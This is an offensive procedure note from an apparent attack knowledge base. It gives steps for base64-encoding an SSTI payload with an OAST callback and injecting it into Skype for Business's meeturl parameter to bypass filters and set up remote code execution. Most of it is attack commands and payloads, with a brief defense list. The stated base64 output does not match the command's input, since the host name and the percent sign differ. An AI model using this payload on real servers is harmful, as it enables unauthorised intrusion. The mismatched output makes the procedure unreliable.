---
tags:
  - ssti
  - payload-injection
  - encoding
type: procedure
tools:
  - '[[tools/base64]]'
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/encode-ssti-payload-base64]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Windows Command Shell]]'
updated_at: '2025-12-14T17:30:07.375Z'
sub_techniques: []
id: 6af52051-9be2-4af0-a081-566c1fe3c65f
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Windows Command Shell]]'
---
# Encode-and-Inject-SSTI-Payload

## Summary

This procedure encodes an SSTI detection payload in base64 and injects it into the meeturl parameter to exploit template injection in Skype for Business.

## Description

The attack leverages improper handling of base64-decoded input, allowing SSTI expressions like %{1337*1337} to evaluate. Targets unpatched CVEs. Requires encoding tool and Burp. Outcomes: Payload set for execution, confirming vulnerability.

## Requirements

1. Base64 encoding utility available
2. SSTI payload crafted with OAST callback
3. Burp Repeater with modified URL

## Defense

Defensive measures and detection strategies:

- Decode and sanitize base64 inputs before processing
- Disable template engines or restrict expressions in web apps
- Monitor for OAST callbacks or anomalous math expressions in logs

## Objectives

1. Bypass filters with base64 encoding
2. Inject and detect SSTI via callback
3. Enable further RCE payloads

## Instructions

### Step 1: Craft and Encode Payload

**Context**: Create a URL with SSTI and encode it to evade detection.

**Command** ([[commands/encode-ssti-payload-base64]]):
```bash
echo -n 'http://cmd4cvnei56gu9etg220pa1hb7eewx6cu.oast.fun/?id=LMN%{1337*1337}#.xx//' | base64
```

> Outputs encoded string. Explanation: Pipes plaintext payload to base64; result is aHR0cDovL2NtZDRjdm5laTU2Z3U5ZXRnMjIwb3AxaGI3ZWV3eDZjdS5vYXN0LmZ1bi8/aWQ9TE1OJTI1ezEzMzcqMTMzN30jLnh4Ly8=. Use this as meeturl value.

### Step 2: Inject in Burp

**Context**: Update the request parameter with encoded value.

GUI action:

```plaintext
meeturl=aHR0cDovL2NtZDRjdm5laTU2Z3U5ZXRnMjIwb3AxaGI3ZWV3eDZjdS5vYXN0LmZ1bi8/aWQ9TE1OJTI1ezEzMzcqMTMzN30jLnh4Ly8=
```

> Expected output: Request updated; preview shows valid HTTP.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Windows Command Shell]]

### Sub-Techniques


## Commands Used

- [[commands/encode-ssti-payload-base64]]

## Tools Used

- [[tools/base64]]
- [[tools/Burp-Suite]]

## Tags

- [[ssti]]
- [[payload-injection]]
- [[encoding]]
